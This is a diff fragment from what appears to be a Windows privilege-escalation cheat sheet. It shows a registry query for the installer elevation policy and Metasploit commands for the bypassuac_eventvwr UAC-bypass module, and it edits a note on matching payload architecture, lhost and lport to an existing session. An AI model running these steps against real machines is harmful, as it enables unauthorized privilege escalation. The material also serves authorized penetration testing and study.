@@ -28,7 +28,7 @@ reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 use exploit/windows/local/bypassuac_eventvwr
 set session 1
 set target 1(x64,0=x86)
-Note to set payload the same arch with malicious file
+Note to set payload the same arch with session 1's payload，set lhost and lport same with session 1
 ```
 ##### Insecure File Permissions
 ```
